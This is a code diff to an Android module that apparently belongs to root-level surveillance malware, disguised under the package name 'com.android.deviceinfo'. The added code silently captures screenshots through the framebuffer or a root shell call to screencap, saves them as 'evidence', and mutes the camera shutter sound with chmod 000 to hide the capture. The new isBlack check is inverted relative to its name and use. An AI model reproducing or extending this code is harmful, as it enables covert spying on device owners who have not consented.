@@ -17,15 +17,18 @@ import java.util.concurrent.Semaphore;
 
 import android.content.Context;
 import android.graphics.Bitmap;
+import android.graphics.BitmapFactory;
 import android.graphics.Matrix;
 import android.os.Build;
 import android.view.Display;
 import android.view.Surface;
 import android.view.WindowManager;
 
+import com.android.deviceinfo.Root;
 import com.android.deviceinfo.Status;
 import com.android.deviceinfo.auto.Cfg;
 import com.android.deviceinfo.conf.ConfModule;
+import com.android.deviceinfo.conf.Configuration;
 import com.android.deviceinfo.conf.ConfigurationException;
 import com.android.deviceinfo.evidence.EvidenceReference;
 import com.android.deviceinfo.evidence.EvidenceType;
@@ -33,9 +36,10 @@ import com.android.deviceinfo.file.AutoFile;
 import com.android.deviceinfo.listener.ListenerStandby;
 import com.android.deviceinfo.util.Check;
 import com.android.deviceinfo.util.DataBuffer;
+import com.android.deviceinfo.util.Execute;
+import com.android.deviceinfo.util.ExecuteResult;
 import com.android.deviceinfo.util.WChar;
 import com.android.m.M;
-
 
 /**
  * The Class SnapshotAgent.
@@ -56,6 +60,8 @@ public class ModuleSnapshot extends BaseInstantModule {
 	/** The Constant CAPTURE_FOREGROUND. */
 	final private static int CAPTURE_FOREGROUND = 1;
 
+	String cameraSound = M.e("/system/media/audio/ui/camera_click.ogg");
+
 	/** The delay. */
 	private int delay;
 
@@ -63,6 +69,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 	private int type;
 	private int quality;
 	Semaphore working = new Semaphore(1, true);
+
+	private boolean frameBuffer = true;
+	private boolean screenCap = true;
 
 	/*
 	 * (non-Javadoc)
@@ -72,7 +81,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 	@Override
 	public boolean parse(ConfModule conf) {
 
-		if ( !Status.self().haveRoot() ) {
+		if (!Status.self().haveRoot()) {
 			return false;
 		}
 
@@ -128,6 +137,101 @@ public class ModuleSnapshot extends BaseInstantModule {
 		}
 
 		try {
+			if (!frameBufferMethod()) {
+				frameBuffer = false;
+				if (!screencapMethod()) {
+					screenCap = false;
+				}
+			}
+
+		} catch (final Exception ex) {
+			if (Cfg.EXCEPTION) {
+				Check.log(ex);
+			}
+
+			if (Cfg.DEBUG) {
+				Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
+				Check.log(ex);//$NON-NLS-1$
+			}
+		} finally {
+			working.release();
+		}
+
+	}
+
+	private boolean screencapMethod() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (screencapMethod) ");
+		}
+
+		if (!screenCap) {
+			return false;
+		}
+		// Questa utility chiama solo una IOCTL
+		// http://forum.xda-developers.com/showpost.php?p=41461956
+		String sc = M.e("/system/bin/screencap");
+		String frame = M.e("/data/data/") + Status.self().getAppContext().getPackageName() + M.e("/files/frame.png");
+
+		AutoFile asc = new AutoFile(sc);
+		AutoFile aframe = new AutoFile(frame);
+		aframe.delete();
+
+		if (asc.exists() && asc.canRead()) {
+
+			try {
+				disableClick();
+
+				ExecuteResult res = Execute.executeScript(sc + " -p " + frame + ";chmod 777 " + frame);
+				if (aframe.exists() && aframe.canRead()) {
+					Bitmap bitmap = readPng(aframe);
+					if (bitmap == null) {
+						return false;
+					}
+					byte[] jpeg = toJpeg(bitmap);
+					if (jpeg == null) {
+						return false;
+					}
+					EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
+					return true;
+				}
+
+			}finally{
+				aframe.delete();
+				enableClick();
+			}
+		}
+		return false;
+	}
+
+	private void enableClick() {
+		AutoFile file = new AutoFile(cameraSound);
+		if (file.exists()) {
+			file.chmod("777");
+		}
+	}
+
+	private void disableClick() {
+		AutoFile file = new AutoFile(cameraSound);
+		if (file.exists()) {
+			file.chmod("000");
+		}
+	}
+
+	private Bitmap readPng(AutoFile aframe) {
+		Bitmap bitmap = BitmapFactory.decodeFile(aframe.getFilename());
+		return bitmap;
+	}
+
+	private boolean frameBufferMethod() {
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (frameBufferMethod) ");
+		}
+
+		if (!frameBuffer) {
+			return false;
+		}
+
+		try {
 			final Display display = ((WindowManager) Status.getAppContext().getSystemService(Context.WINDOW_SERVICE))
 					.getDefaultDisplay();
 
@@ -157,7 +261,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 				Check.log(TAG + " (go): w=" + width + " h=" + height);//$NON-NLS-1$ //$NON-NLS-2$
 			}
 
-			Bitmap bitmap;
+			Bitmap bitmap = null;
 
 			// 0: invertito blu e rosso
 			// 1: perdita info
@@ -167,11 +271,17 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 			if (raw == null || raw.length == 0) {
 				if (Cfg.DEBUG) {
-					Check.log(TAG + " (actualStart): raw bitmap is null or has 0 length"); //$NON-NLS-1$
+					Check.log(TAG + " (frameBufferMethod): raw bitmap is null or has 0 length"); //$NON-NLS-1$
 				}
-
+				return false;
 			} else {
 
+				if (isBlack(raw)) {
+					if (Cfg.DEBUG) {
+						Check.log(TAG + " (frameBufferMethod): all black");
+					}
+					return false;
+				}
 				if (usesInvertedColors()) {
 					// sul tablet non e' ARGB ma ABGR.
 					byte[] newraw = new byte[raw.length / 2];
@@ -201,14 +311,14 @@ public class ModuleSnapshot extends BaseInstantModule {
 					}
 
 					raw = newraw;
+					bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
 				}
 
-				if (raw != null) {
-					bitmap = Bitmap.createBitmap(width, height, Bitmap.Config.ARGB_8888);
-				} else {
-					return;
-				}
 				ByteBuffer buffer = ByteBuffer.wrap(raw);
+				if (buffer == null) {
+					return false;
+				}
+				
 				bitmap.copyPixelsFromBuffer(buffer);
 				buffer = null;
 				raw = null;
@@ -240,21 +350,24 @@ public class ModuleSnapshot extends BaseInstantModule {
 
 				EvidenceReference.atomic(EvidenceType.SNAPSHOT, getAdditionalData(), jpeg);
 				jpeg = null;
-			}
 
-		} catch (final Exception ex) {
-			if (Cfg.EXCEPTION) {
-				Check.log(ex);
 			}
-
+			return true;
+		} catch (Exception ex) {
 			if (Cfg.DEBUG) {
-				Check.log(TAG + " (go) Error: " + ex);//$NON-NLS-1$
-				Check.log(ex);//$NON-NLS-1$
+				Check.log(TAG + " (frameBufferMethod) Error: " + ex);
 			}
-		} finally {
-			working.release();
+			return false;
 		}
+	}
 
+	private boolean isBlack(byte[] raw) {
+		for (int i = 0; i < raw.length; i++) {
+			if (raw[i] != 0) {
+				return true;
+			}
+		}
+		return false;
 	}
 
 	private boolean isTablet() {
@@ -287,7 +400,7 @@ public class ModuleSnapshot extends BaseInstantModule {
 		if (model.contains("gt-i9100")) {
 			return true;
 		}
-		
+
 		// Samsung Galaxy S3
 		if (model.contains("gt-i9300")) {
 			return true;
@@ -343,17 +456,13 @@ public class ModuleSnapshot extends BaseInstantModule {
 		final File filesPath = Status.getAppContext().getFilesDir();
 		final String path = filesPath.getAbsolutePath();
 
-		// 11_2=/system/bin/ntpsvd fb
-		final String getrawpath = M.e("/system/bin/ntpsvd fb"); //$NON-NLS-1$
-
 		try {
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): calling frame generator");
 			}
 
-			// a_0=/system/bin/ntpsvd
-			final Process localProcess = Runtime.getRuntime().exec(new String[] { M.e("/system/bin/rilcap"), "fb", "/data/data/" + Status.self().getAppContext().getPackageName() + "/files/frame" });
-			localProcess.waitFor();
+			Execute.execute(Configuration.shellFile + " fb /data/data/"
+					+ Status.self().getAppContext().getPackageName() + "/files/frame");
 
 			if (Cfg.DEBUG) {
 				Check.log(TAG + " (getRawBitmap): finished calling frame generator");
@@ -364,21 +473,9 @@ public class ModuleSnapshot extends BaseInstantModule {
 			if (file.exists()) {
 				return file.read();
 			}
-		} catch (final IOException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
+		} catch (Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
-			}
-		} catch (final InterruptedException e) {
-			if (Cfg.EXCEPTION) {
-				Check.log(e);
-			}
-
-			if (Cfg.DEBUG) {
-				Check.log(e);//$NON-NLS-1$
+				Check.log(TAG + " (getRawBitmap) Error: " + e);
 			}
 		}
 
